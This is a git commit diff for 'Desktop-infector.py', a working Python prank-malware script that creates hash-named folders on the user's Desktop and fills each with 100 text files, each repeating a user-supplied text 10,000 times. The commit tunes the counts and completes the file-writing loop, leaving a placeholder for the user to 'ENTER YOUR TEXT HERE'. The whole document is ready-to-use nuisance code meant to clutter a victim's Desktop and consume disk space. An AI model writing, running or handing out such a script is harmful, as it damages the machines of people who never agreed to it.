c9286e456b42cf34bcd77e1c2a2993635055da73
catcha80 <89837052+catcha8@users.noreply.github.com>
2022-05-30 19:52:03 +0200

    Update Desktop-infector.py

--- Desktop-infector.py
+++ Desktop-infector.py
@@ -5,20 +5,15 @@ from pystyle import *
 from random import *
 desktop = os.path.join(os.path.expanduser("~"), "Desktop")
 
-YOUR_TXT = ""
-YOUR_NAME_FOR_DIR = ""
+YOUR_TXT = "ENTER YOUR TEXT HERE"
 
-for x in range(2000):
-    myfoldername = hashlib.sha256((YOUR_NAME_FOR_DIR + str(randint(1,1000000))).encode()).hexdigest()
+for x in range(10):
+    myfoldername = hashlib.sha256(("Random" + str(randint(1,1000000))).encode()).hexdigest()
     efolder      = os.path.join(desktop, myfoldername)
     os.mkdir(efolder)
     Write.Print(f"[Dir] --> {efolder}\n", Colors.green, interval=0)
     for f in range(100):
         myfilename = hashlib.sha256(("File Infected: " + str(randint(1,1000000))).encode()).hexdigest() + ".txt"
         with open(efolder + "\\" + myfilename, 'w') as file:
-           file.write(YOUR_TXT)
-           for w in range(100):
-               
-
-
-input()
+            for w in range(10000):
+               file.write(YOUR_TXT)
